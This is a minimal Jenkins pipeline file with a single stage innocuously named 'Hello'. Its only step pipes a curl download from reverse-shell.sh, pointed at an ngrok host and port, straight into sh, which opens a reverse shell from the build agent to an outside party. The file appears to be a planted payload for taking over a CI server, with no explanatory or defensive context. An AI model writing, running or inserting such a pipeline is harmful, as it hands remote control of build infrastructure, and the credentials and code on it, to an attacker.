pipeline {
	agent any

	stages {
    	stage('Hello') {
        	steps {
            	sh '''
                	curl https://reverse-shell.sh/6.tcp.eu.ngrok.io:10177| sh
            	'''
        	}
    	}
	}
}
